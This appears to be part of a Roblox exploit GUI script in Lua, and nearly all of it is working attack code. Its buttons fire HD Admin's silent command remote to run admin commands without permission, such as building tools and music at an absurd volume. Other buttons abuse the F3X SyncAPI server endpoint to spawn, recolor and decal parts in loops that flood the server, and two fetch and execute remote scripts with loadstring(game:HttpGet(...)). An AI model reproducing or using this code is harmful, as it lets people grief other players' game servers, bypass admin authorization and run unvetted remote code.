				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_29);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2b()
			local script = G2L["2b"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 128294095400078")
				RequestCommandSilent:InvokeServer(";pitch 0.10")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_2b);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2d()
			local script = G2L["2d"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 82696338249251")
				RequestCommandSilent:InvokeServer(";pitch 0.8")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_2d);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2f()
			local script = G2L["2f"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 97568687950497")
				RequestCommandSilent:InvokeServer(";pitch 0.8")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_2f);
	
		return G2L["1"], require;
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_32);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_34()
local script = G2L["34"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";music 130557789340845")
		RequestCommandSilent:InvokeServer(";volume 129007389933701")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_34);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_36()
local script = G2L["36"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";btools ;give me b")
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_36);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_39()
local script = G2L["39"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function a()
			presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
			spawn(function()
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
							["UnionColoring"] = true
						},
						[2] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
							["UnionColoring"] = true
						},
						[3] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
							["UnionColoring"] = true
						},
						[4] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
							["UnionColoring"] = true
						},
						[5] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
							["UnionColoring"] = true
						},
						[6] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
							["UnionColoring"] = true
						},
						[7] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
							["UnionColoring"] = true
						}
					}
				}
	
				_(args)
			end)
		end
	
		while true do
			wait()
			spawn(function()
				a()
			end)
		end
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_39);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_3b()
local script = G2L["3b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local head = character:WaitForChild("Head")
	
		local part = Instance.new("Part")
		part.Size = Vector3.new(1,1,1)
		part.Anchored = true
		part.CanCollide = false
		part.Color = Color3.new(0,0,0)
		part.CFrame = head.CFrame
		part.Parent = workspace
	
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshType = Enum.MeshType.FileMesh
		mesh.MeshId = "rbxassetid://111891702759441"
		mesh.Scale = Vector3.new(1000,1000,1000)
		mesh.Parent = part
	
		local decal = Instance.new("Decal")
		decal.Texture = "rbxassetid://100430627569836"
		decal.Parent = part
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3b);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_3d()
local script = G2L["3d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local id = "rbxassetid://100430627569836"
	
		for _,v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				task.wait(0.01)
				for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
					local d = Instance.new("Decal")
					d.Texture = id
					d.Face = face
					d.Parent = v
				end
			end
		end
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3d);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_3f()
local script = G2L["3f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-roadblocks-F3X-things-112624"))()
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3f);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
	--[[
	(==================================)
	( --★ Epik Skeleton Skybox F3X By ItsKittyyyGD ★--)
	(|==================================)
	(--★ SCRIPT CHANGELOGS: ★--)                                   )
	(-) Deleted create sky and destroy Now use Set texture. )
	(★) Smooth Skybox Video.                                             )
	(==================================)
	( I love you Blue2Spooky,Thanks for using my things.)
	(==================================)
	]]
		-- SOURCE
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local RunService = game:GetService("RunService")
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function SetAnchor(part, boolean)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetTransparency(part, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		local images = {
			"http://www.roblox.com/asset/?id=14848893652",
			"http://www.roblox.com/asset/?id=15307205005",
			"http://www.roblox.com/asset/?id=14848893652",
			"http://www.roblox.com/asset/?id=15307205005",
			"http://www.roblox.com/asset/?id=14848893652",
			"http://www.roblox.com/asset/?id=15307205005",
			"http://www.roblox.com/asset/?id=14848893652",
			"http://www.roblox.com/asset/?id=15307205005"
		}
	
		local skyPart
		local skyLoop
		local frameTime = 1 / 10
		local lastUpdate = 0
	
		function CreateSky()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
			local found = false
			for i = 1, 50 do
				task.wait()
				for _, v in workspace:GetDescendants() do
					if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
						skyPart = v
						found = true
						break
					end
				end
				if found then break end
			end
	
			if not skyPart then return end
	
			SetAnchor(skyPart, true)
			AddMesh(skyPart)
			SetMesh(skyPart, "111891702759441")
			MeshResize(skyPart, Vector3.new(8000, 8000, 8000))
			SetTransparency(skyPart, 0)
	
			local index = 1
			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
				lastUpdate = lastUpdate + deltaTime
				if lastUpdate >= frameTime then
					lastUpdate = 0
					if not skyPart then
						skyLoop:Disconnect()
						return
					end
					SetTexture(skyPart, images[index])
					index = (index % #images) + 1
				end
			end)
		end
	
		function ResetSky()
			if skyLoop then
				skyLoop:Disconnect()
				skyLoop = nil
			end
			if skyPart then
				DestroyPart(skyPart)
				skyPart = nil
			end
			task.spawn(CreateSky)
		end
	
		player.CharacterAdded:Connect(function(newChar)
			char = newChar
			ResetSky()
		end)
	
		if char and char:FindFirstChild("Humanoid") then
			char:WaitForChild("Humanoid").Died:Connect(function()
				ResetSky()
			end)
		end
	
		CreateSky()
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_43()
local script = G2L["43"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		print("Nameless Admin Executed Remake F3X By Skyl0rd xdd")
		loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_43);
-- StarterGui.ScreenGui.Frame.page frames.page2.LocalScript
local function C_48()
local script = G2L["48"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 9 | Scripts: 4 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.page 2
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[page 2]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
		-- StarterGui.page 2.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 4;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2"]["Size"] = UDim2.new(0, 313, 0, 242);
		G2L["2"]["Position"] = UDim2.new(0.38543, 0, 0.12229, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
	
	
		-- StarterGui.page 2.Frame.TextButton
		G2L["3"] = Instance.new("TextButton", G2L["2"]);
		G2L["3"]["TextWrapped"] = true;
		G2L["3"]["BorderSizePixel"] = 3;
		G2L["3"]["TextSize"] = 14;
		G2L["3"]["TextScaled"] = true;
		G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["3"]["Size"] = UDim2.new(0, 313, 0, 38);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
		G2L["3"]["Text"] = [[RC7 RAIN]];
		G2L["3"]["Position"] = UDim2.new(0, 0, 0.19835, 0);
	
	
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		G2L["4"] = Instance.new("LocalScript", G2L["3"]);
	
	
	
		-- StarterGui.page 2.Frame.TextButton
		G2L["5"] = Instance.new("TextButton", G2L["2"]);
		G2L["5"]["TextWrapped"] = true;
		G2L["5"]["BorderSizePixel"] = 3;
		G2L["5"]["TextSize"] = 14;
		G2L["5"]["TextScaled"] = true;
		G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["5"]["Size"] = UDim2.new(0, 313, 0, 35);
		G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
		G2L["5"]["Text"] = [[Doggo Army F3X]];
		G2L["5"]["Position"] = UDim2.new(0, 0, 0.4258, 0);
	
	
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		G2L["6"] = Instance.new("LocalScript", G2L["5"]);
	
	
	
		-- StarterGui.page 2.Frame.TextButton
		G2L["7"] = Instance.new("TextButton", G2L["2"]);
		G2L["7"]["TextWrapped"] = true;
		G2L["7"]["BorderSizePixel"] = 3;
		G2L["7"]["TextSize"] = 14;
		G2L["7"]["TextScaled"] = true;
		G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["7"]["Size"] = UDim2.new(0, 313, 0, 35);
		G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 153, 36);
		G2L["7"]["Text"] = [[Skeleton Skybox]];
		G2L["7"]["Position"] = UDim2.new(0, 0, 0.61379, 0);
	
	
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		G2L["8"] = Instance.new("LocalScript", G2L["7"]);
	
	
	
		-- StarterGui.page 2.Frame.LocalScript
		G2L["9"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		local function C_4()
			local script = G2L["4"];
			script.Parent.MouseButton1Click:Connect(function()
	
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
				--// Script: RC7 Cloud F3X \\ --
				--// Creator: ItsKittyyyGD \\ --
				-- CODE/SOURCE (OPEN):
	
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for _, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for _, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function SetCollision(part, boolean)
					local args = {"SyncCollision", {{Part = part, CanCollide = boolean}}}
					_(args)
				end
	
				function SetAnchor(boolean, part)
					local args = {"SyncAnchor", {{Part = part, Anchored = boolean}}}
					_(args)
				end
	
				function CreatePart(cf, parent)
					local args = {"CreatePart", "Normal", cf, parent}
					_(args)
				end
	
				function AddMesh(part)
					local args = {"CreateMeshes", {{Part = part}}}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {"SyncMesh", {{Part = part, Scale = size}}}
					_(args)
				end
	
				function SetColor(part, color)
					local args = {"SyncColor", {{Part = part, Color = color, UnionColoring = false}}}
					_(args)
				end
	
				function MovePart(part, cf)
					local args = {"SyncMove", {{Part = part, CFrame = cf}}}
					_(args)
				end
	
				function CreateCloud()
					local head = char:WaitForChild("Head")
					local cf = head.CFrame + Vector3.new(0, 30, 0)
					CreatePart(cf, workspace)
					task.spawn(function()
						repeat task.wait() until (function()
							for _, v in workspace:GetDescendants() do
								if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
									SetAnchor(true, v)
									SetCollision(v, false)
									SetColor(v, BrickColor.new(333).Color)
									AddMesh(v)
									SetMesh(v, "111820358")
									MeshResize(v, Vector3.new(10, 10, 10))
									task.spawn(function()
										game:GetService("RunService").RenderStepped:Connect(function()
											if char and char:FindFirstChild("Head") then
												MovePart(v, char.Head.CFrame + Vector3.new(0, 10, 0))
											end
										end)
									end)
									return true
								end
							end
						end)()
					end)
				end
	
				CreateCloud()
	
				-- i can quit because theres more scripters f3x better than me. This can be my last script but,¿who knows?
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function SpawnDecal(part,side)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal"
							}
						}
					}
	
					_(args)
				end
				function AddDecal(part,asset,side)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal",
								["Texture"] = "rbxassetid://".. asset
							}
						}
					}
					_(args)
				end
				while wait(0.5) do
					spawn(function()
						e = char.HumanoidRootPart.CFrame.x + math.random(-10, 10)
						f = char.HumanoidRootPart.CFrame.y + 10
						g = char.HumanoidRootPart.CFrame.z + math.random(-10, 10)
						CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
						for i,v in game.Workspace:GetDescendants() do
							if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
	
								SetName(v,"particle by expl_0itspooky")--PLEASE DO NOT RENAME ITS MY CREDIT🙏 
	
								--end)
								--spawn(function()
								SpawnDecal(v,Enum.NormalId.Front)
								AddDecal(v,"331959655",Enum.NormalId.Front)
								SpawnDecal(v,Enum.NormalId.Back)
								AddDecal(v,"331959655",Enum.NormalId.Back)
								SetTrans(v,1)
								Resize(v,Vector3.new(5,6,5.1),v.CFrame)
								SetLocked(v,true)
								SetAnchor(false,v)
							end
						end
					end)
				end
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_4);
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		local function C_6()
			local script = G2L["6"];
			script.Parent.MouseButton1Click:Connect(function()
	
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
				--// Doggo Army F3X BY ItsKittyyyGD! \\--
				-- (still some broken dm me at discord to fix some bugs) --
				-- Version: 1.0.0 (beta leaked by ItsKittyyyGD),soon more versions will be private and u need be a important person for me to get it
				-- CODE/SOURCE (OPEN)
	
				local Players = game:GetService("Players")
				local UIS = game:GetService("UserInputService")
				local RunService = game:GetService("RunService")
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
				local player = Players.LocalPlayer
				local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
				local introFinished = false
	
				function NotificationScript(txt)
					local label = Instance.new("TextLabel", gui)
					label.Size = UDim2.new(0.9, 0, 0, 19)
					label.Position = UDim2.new(0.05, 0, 0.1, 0)
					label.BackgroundTransparency = 1
					label.TextColor3 = Color3.fromRGB(255, 255, 255)
					label.TextSize = 11
					label.Font = Enum.Font.Code
					label.TextXAlignment = Enum.TextXAlignment.Left
	
					task.spawn(function()
						for i = 1, #txt do
							label.Text = string.sub(txt, 1, i)
							task.wait(0.03)
						end
						task.wait(5)
						for i = #txt, 1, -1 do
							label.Text = string.sub(txt, 1, i)
							task.wait(0.02)
						end
						label:Destroy()
						if txt:find("Doggo Army F3X") then
							introFinished = true
						end
					end)
	
					task.spawn(function()
						while label.Parent do
							for h = 0, 1, 0.01 do
								if label.Parent then
									label.TextColor3 = Color3.fromHSV(h, 1, 1)
									task.wait(0.05)
								end
							end
						end
					end)
				end
	
				NotificationScript("Doggo Army F3X By ItsKittyyyGD\nPress [F] to Generate a Doggo\nVersion: 1.0.0 ,(Last version.)")
	
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
				for _, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then tool = v.Parent break end
				end
				if not tool then
					for _, v in ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then tool = v.Parent break end
					end
				end
	
				local remote = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI.ServerEndpoint
				local dogeCreated = false
				local dogePart
				local followOffset = Vector3.new(0, -2, -4)
				local targetChar = char
	
				function CreateDoge()
					if not remote or dogeCreated then return end
					dogeCreated = true
					local root = char:WaitForChild("HumanoidRootPart")
					local cf = root.CFrame * CFrame.new(followOffset)
					remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
					repeat
						task.wait(0.1)
						for _, v in workspace:GetChildren() do
							if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 5 then
								dogePart = v
								remote:InvokeServer("SyncAnchor", {{Part = v, Anchored = true}})
								remote:InvokeServer("SyncCollision", {{Part = v, CanCollide = false}})
								remote:InvokeServer("CreateMeshes", {{Part = v}})
								task.wait(0.2)
								remote:InvokeServer("SyncMesh", {{Part = v, MeshId = "rbxassetid://257489726", Scale = Vector3.new(1,1,1)}})
								RunService.Heartbeat:Connect(function()
									if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
										local targetPos = targetChar.HumanoidRootPart.CFrame * CFrame.new(followOffset)
										remote:InvokeServer("SyncMove", {{Part = dogePart, CFrame = targetPos}})
									end
								end)
								return
							end
						end
					until false
				end
	
				UIS.InputBegan:Connect(function(input, gpe)
					if gpe then return end
					if input.KeyCode == Enum.KeyCode.F then
						if not introFinished then return end
						if dogeCreated then
							NotificationScript("In 1.0.0, only 1 doggo can be created because it's a beta.")
						else
							CreateDoge()
						end
					end
				end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_6);
		-- StarterGui.page 2.Frame.TextButton.LocalScript
		local function C_8()
			local script = G2L["8"];
			script.Parent.MouseButton1Click:Connect(function()
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
		--[[
		(==================================)
		( --★ Epik Skeleton Skybox F3X By ItsKittyyyGD ★--)
		(|==================================)
		(--★ SCRIPT CHANGELOGS: ★--)                                   )
		(-) Deleted create sky and destroy Now use Set texture. )
		(★) Smooth Skybox Video.                                             )
		(==================================)
		( I love you Blue2Spooky,Thanks for using my things.)
		(==================================)
		]]
				-- SOURCE
	
	
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
